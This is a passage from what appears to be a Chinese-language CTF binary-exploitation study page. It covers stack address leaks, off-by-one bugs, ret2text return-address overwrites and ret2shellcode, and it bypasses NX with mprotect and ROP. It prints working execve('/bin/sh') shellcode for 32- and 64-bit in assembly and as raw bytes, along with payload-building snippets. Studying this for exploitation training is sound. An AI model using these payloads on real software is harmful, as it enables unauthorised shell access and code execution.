<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kt>char</span> <span class=o>*</span><span class=p>))</span><span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>funcs_list</span> <span class=o>+</span> <span class=mi>3</span> <span class=o>*</span> <span class=n>idx</span><span class=p>))(</span><span class=n>arg_list</span><span class=p>);</span></span></span></code></pre></div></div><h3 id=地址泄露>地址泄露</h3><p><strong>read 漏洞点</strong></p><p>无 canary 时，下述代码泄露栈地址，构造<code>payload=b'a'*0x30</code>，接收 48 个 a 后会泄露出后续栈地址内容</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>48</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x40uLL</span><span class=p>);</span> <span class=c1>// 末尾不为0则打印出后续内容
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>无截断泄露</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>len</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>input</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=o>*</span><span class=p>(</span><span class=n>input</span><span class=o>+</span><span class=n>len</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=sc>&#39;\n&#39;</span><span class=p>)</span> <span class=c1>// 最后一个值不传入\n
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=n>input</span><span class=o>+</span><span class=n>len</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>command_name</span> <span class=o>=</span> <span class=nf>strtok</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=s>&#34; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>command_name</span><span class=p>);</span> <span class=c1>// 结尾无\0截断可泄露后续栈地址或进程基址或libc[_IO_2_1_stderr_]地址
</span></span></span></code></pre></div></div><p><strong>栈溢出逻辑漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>len</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=c1>// 循环i+1次
</span></span></span></code></pre></div></div><p><strong>循环完后，使用循环变量造成越界</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// off by null
</span></span></span></code></pre></div></div><h3 id=ret2text>ret2text</h3><ul><li>退栈过程，返回地址会传给 eip，让溢出数据用攻击指令的地址覆盖返回地址</li><li>攻击指令的地址一般为用户中存在的后门函数地址，即已存在</li><li>（考虑最简单情况 canary 并未保护，则 stack frame pointer 和局部变量之间没有 canary 的随机值）</li></ul><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// [esp+8h] [ebp-10h]    距离ebp 16字节, 距离esp 8字节 =&gt; 8字节缓冲区
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>32 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 覆盖返回地址</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>execve_plt_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>arg1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>arg2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>arg3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># arg1:/bin/sh_addr</span>
</span></span><span class=line><span class=cl><span class=c1># arg2:argv[] = 0</span>
</span></span><span class=line><span class=cl><span class=c1># arg3:envp[] = 0</span>
</span></span><span class=line><span class=cl><span class=c1># ret_addr可随意填写, 指代execve函数执行后的返回地址</span></span></span></code></pre></div></div><p><strong>有后门函数</strong>：覆盖完缓冲区 padding 字节，覆盖 ebp 的值 4 字节，最后覆盖返回地址</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=n>padding</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;BBBB&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>backdoor_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 后门函数使用elf.symbols[&#39;函数名&#39;]</span></span></span></code></pre></div></div><p><strong>64 位</strong></p><p>可能会遇到<code>RSP 16</code>字节对齐问题，可以使用两种方法来达成目的：</p><ol><li>将后门函数地址+1 来跳过<code>push rbp</code>调整 rsp 栈帧，前提是后门函数第一个指令为<code>push rbp</code>，指令长度 1 字节</li><li>在后门函数地址前加入<code>ret</code>指令地址调整 rsp 栈帧</li></ol><h3 id=ret2shellcode>ret2shellcode</h3><blockquote><p>无后门函数且栈可执行时，使用 ret2shellcode</p></blockquote><p>shellcode 汇编</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-Assembly data-lang=Assembly>.intel_syntax noprefix
.text
.globl _start
.type _start, @function

_start:
    xxx
    xxx</code></pre></div><p>生成 shellcode</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>gcc -c start.s -o start.o
</span></span><span class=line><span class=cl>ld -e _start -z noexecstack start.o -o start</span></span></code></pre></div></div><p>可以在 <strong><a href=https://shell-storm.org/shellcode/index.html target=_blank rel="noopener noreffer">shellcode 数据库</a></strong> 寻找适合的 shellcode</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>xchg edi, eax ; 交换两个寄存器值, 比 mov 机器码短</code></pre></div><p><strong>32 位</strong></p><p>21 字节 shellcode：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    push 0x68732f
</span></span></span><span class=line><span class=cl><span class=s2>    push 0x6e69622f
</span></span></span><span class=line><span class=cl><span class=s2>    mov ebx,esp
</span></span></span><span class=line><span class=cl><span class=s2>    xor ecx,ecx
</span></span></span><span class=line><span class=cl><span class=s2>    xor edx,edx
</span></span></span><span class=line><span class=cl><span class=s2>    push 11
</span></span></span><span class=line><span class=cl><span class=s2>    pop eax
</span></span></span><span class=line><span class=cl><span class=s2>    int 0x80
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span></span></span></code></pre></div></div><p>无<code>\x00</code>截断，21 字节</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>\<span class=n>x6a</span>\<span class=n>x0b</span>\<span class=n>x58</span>\<span class=n>x99</span>\<span class=n>x52</span>\<span class=n>x68</span>\<span class=n>x2f</span>\<span class=n>x2f</span>\<span class=n>x73</span>\<span class=n>x68</span>\<span class=n>x68</span>\<span class=n>x2f</span>\<span class=n>x62</span>\<span class=n>x69</span>\<span class=n>x6e</span>\<span class=n>x89</span>\<span class=n>xe3</span>\<span class=n>x31</span>\<span class=n>xc9</span>\<span class=n>xcd</span>\<span class=n>x80</span></span></span></code></pre></div></div><p>41 字节 scanf 可读取</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>\<span class=n>xeb</span>\<span class=n>x1b</span>\<span class=n>x5e</span>\<span class=n>x89</span>\<span class=n>xf3</span>\<span class=n>x89</span>\<span class=n>xf7</span>\<span class=n>x83</span>\<span class=n>xc7</span>\<span class=n>x07</span>\<span class=n>x29</span>\<span class=n>xc0</span>\<span class=n>xaa</span>\<span class=n>x89</span>\<span class=n>xf9</span>\<span class=n>x89</span>\<span class=n>xf0</span>\<span class=n>xab</span>\<span class=n>x89</span>\<span class=n>xfa</span>\<span class=n>x29</span>\<span class=n>xc0</span>\<span class=n>xab</span>\<span class=n>xb0</span>\<span class=n>x08</span>\<span class=n>x04</span>\<span class=n>x03</span>\<span class=n>xcd</span>\<span class=n>x80</span>\<span class=n>xe8</span>\<span class=n>xe0</span>\<span class=n>xff</span>\<span class=n>xff</span>\<span class=n>xff</span><span class=o>/</span><span class=nb>bin</span><span class=o>/</span><span class=n>sh</span></span></span></code></pre></div></div><p><strong>64 位</strong></p><p>22 字节 shellcode：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    mov rbx, 0x68732f6e69622f
</span></span></span><span class=line><span class=cl><span class=s2>    push rbx
</span></span></span><span class=line><span class=cl><span class=s2>    push rsp
</span></span></span><span class=line><span class=cl><span class=s2>    pop rdi
</span></span></span><span class=line><span class=cl><span class=s2>    xor esi,esi
</span></span></span><span class=line><span class=cl><span class=s2>    xor edx,edx
</span></span></span><span class=line><span class=cl><span class=s2>    push 0x3b
</span></span></span><span class=line><span class=cl><span class=s2>    pop rax
</span></span></span><span class=line><span class=cl><span class=s2>    syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span></span></span></code></pre></div></div><p>23 字节 shellcode：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=err>\</span><span class=n>x31</span><span class=err>\</span><span class=n>xf6</span><span class=err>\</span><span class=n>x48</span><span class=err>\</span><span class=n>xbb</span><span class=err>\</span><span class=n>x2f</span><span class=err>\</span><span class=n>x62</span><span class=err>\</span><span class=n>x69</span><span class=err>\</span><span class=n>x6e</span><span class=err>\</span><span class=n>x2f</span><span class=err>\</span><span class=n>x2f</span><span class=err>\</span><span class=n>x73</span><span class=err>\</span><span class=n>x68</span><span class=err>\</span><span class=n>x56</span><span class=err>\</span><span class=n>x53</span><span class=err>\</span><span class=n>x54</span><span class=err>\</span><span class=n>x5f</span><span class=err>\</span><span class=n>x6a</span><span class=err>\</span><span class=n>x3b</span><span class=err>\</span><span class=n>x58</span><span class=err>\</span><span class=n>x31</span><span class=err>\</span><span class=n>xd2</span><span class=err>\</span><span class=n>x0f</span><span class=err>\</span><span class=n>x05</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>b</span><span class=s>&#34;</span><span class=se>\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=n>esi</span><span class=p>,</span> <span class=n>esi</span>               <span class=p>;</span> <span class=err>将寄存器</span> <span class=n>esi</span> <span class=err>清零</span>                      <span class=err>\</span><span class=n>x31</span><span class=err>\</span><span class=n>xf6</span>
</span></span><span class=line><span class=cl><span class=n>mov</span> <span class=n>rbx</span><span class=p>,</span> <span class=mh>0x68732f2f6e69622f</span> <span class=p>;</span> <span class=err>将字符串</span> <span class=s>&#34;/bin//sh&#34;</span> <span class=err>存入寄存器</span> <span class=n>rbx</span>
</span></span><span class=line><span class=cl><span class=n>push</span> <span class=mh>0x54</span>                  <span class=p>;</span> <span class=err>将字符串</span> <span class=s>&#34;/bin//sh&#34;</span> <span class=err>压入栈中</span>
</span></span><span class=line><span class=cl><span class=n>push</span> <span class=mh>0x53</span>                  <span class=p>;</span>                                       <span class=err>\</span><span class=n>x48</span><span class=err>\</span><span class=n>xbb</span><span class=err>\</span><span class=n>x2f</span><span class=err>\</span><span class=n>x62</span><span class=err>\</span><span class=n>x69</span><span class=err>\</span><span class=n>x6e</span><span class=err>\</span><span class=n>x2f</span><span class=err>\</span><span class=n>x2f</span><span class=err>\</span><span class=n>x73</span><span class=err>\</span><span class=n>x68</span>
</span></span><span class=line><span class=cl><span class=n>push</span> <span class=n>rbx</span>                   <span class=p>;</span> <span class=err>将字符串</span> <span class=s>&#34;/bin//sh&#34;</span> <span class=err>压入栈中</span>            <span class=err>\</span><span class=n>x56</span><span class=err>\</span><span class=n>x53</span><span class=err>\</span><span class=n>x54</span>
</span></span><span class=line><span class=cl><span class=n>pop</span> <span class=n>rdi</span>                    <span class=p>;</span> <span class=err>将栈顶元素弹出并存入寄存器</span> <span class=n>rdi</span>           <span class=err>\</span><span class=n>x5f</span>
</span></span><span class=line><span class=cl><span class=n>push</span> <span class=mh>0x3b</span>                  <span class=p>;</span> <span class=err>将系统调用号（</span><span class=n>sys_execve</span><span class=err>）压入栈中</span>       <span class=err>\</span><span class=n>x6a</span><span class=err>\</span><span class=n>x3b</span>
</span></span><span class=line><span class=cl><span class=n>pop</span> <span class=n>rax</span>                    <span class=p>;</span> <span class=err>将栈顶元素弹出并存入寄存器</span> <span class=n>rax</span>           <span class=err>\</span><span class=n>x58</span>
</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=n>edx</span><span class=p>,</span> <span class=n>edx</span>               <span class=p>;</span> <span class=err>将寄存器</span> <span class=n>edx</span> <span class=err>清零</span>                       <span class=err>\</span><span class=n>x31</span><span class=err>\</span><span class=n>xd2</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span>                    <span class=p>;</span> <span class=err>执行系统调用</span>                            <span class=err>\</span><span class=n>x0f</span><span class=err>\</span><span class=n>x05</span></span></span></code></pre></div></div><p>无<code>\x00</code>截断且 scanf 可读，22 字节</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>\<span class=n>x48</span>\<span class=n>x31</span>\<span class=n>xf6</span>\<span class=n>x56</span>\<span class=n>x48</span>\<span class=n>xbf</span>\<span class=n>x2f</span>\<span class=n>x62</span>\<span class=n>x69</span>\<span class=n>x6e</span>\<span class=n>x2f</span>\<span class=n>x2f</span>\<span class=n>x73</span>\<span class=n>x68</span>\<span class=n>x57</span>\<span class=n>x54</span>\<span class=n>x5f</span>\<span class=n>xb0</span>\<span class=n>x3b</span>\<span class=n>x99</span>\<span class=n>x0f</span>\<span class=n>x05</span></span></span></code></pre></div></div><p><strong>栈上 shellcode</strong></p><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+0h] [ebp-88h]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x100u</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>((</span><span class=kt>void</span><span class=p>)</span><span class=n>buf</span><span class=p>)(</span><span class=n>arg1</span><span class=p>);</span> <span class=c1>// 执行shellcode
</span></span></span></code></pre></div></div><p>先将 shellcode 写入栈缓冲区，然后篡改返回地址为手动传入的 shellcode 所在缓冲区地址</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>shellcode</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x88</span> <span class=o>+</span> <span class=mh>0x4</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>buf_addr</span><span class=p>)</span> <span class=c1># 填充</span>
</span></span><span class=line><span class=cl><span class=c1># buf_addr即shellcode地址</span>
</span></span><span class=line><span class=cl><span class=c1># \x90: Nop</span></span></span></code></pre></div></div><ul><li><p>由于<code>the NX bits</code>保护措施，栈缓冲区不可执行</p></li><li><p>改为向<strong>bss 缓冲区</strong>（默认可执行）或向<strong>堆缓冲区</strong>写入 shellcode 并使用<strong>mprotect</strong>赋予其可执行权限</p></li><li><p>修改某地址为可执行后可以通过 rop 构造 call rax/rdi 中存储的该地址来执行</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rw_memory</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>call_rax_addr</span><span class=p>)</span></span></span></code></pre></div></div></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>mprotect</span><span class=p>(</span><span class=o>&amp;</span><span class=n>GLOBAL_OFFSET_TABLE_</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=mi>7</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 将全局偏移表所在的size大小的内存区域的权限设置为可读、可写和可执行
</span></span></span></code></pre></div></div><blockquote><p><strong>mprotect</strong>：修改一段指定内存区域的保护属性，绕过 NX</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mmap.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>mprotect</span><span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=n>start</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>,</span> <span class=kt>int</span> <span class=n>prot</span><span class=p>);</span> <span class=c1>// start开始长度len的内存区保护属性改为prot指定值
</span></span></span><span class=line><span class=cl><span class=c1>// 可用“|”将几个属性合起来使用, 指定内存区间必须包含整个内存页（4K） 成功返回0, 失败返回-1
</span></span></span><span class=line><span class=cl><span class=c1>// PROT_READ:内容可写; PROT_WRITE:内容可读; PROT_EXEC:可执行; PROT_NONE:内容不可访问
</span></span></span></code></pre></div></div><p>payload 构造时</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># start位置通过下列操作对齐</span>
</span></span><span class=line><span class=cl><span class=n>buf_addr</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mh>0xFFF</span></span></span></code></pre></div></div></blockquote><p><strong>bss 段上 shellcode</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-64h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>gets</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>strncpy</span><span class=p>(</span><span class=n>buf2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mh>0x64u</span><span class=p>);</span> <span class=c1>//buf2为未初始化的全局变量，在bss中
</span></span></span><span class=line><span class=cl><span class=c1>//复制字符串，从s指向的地址复制0x64u的字符数到buf2中
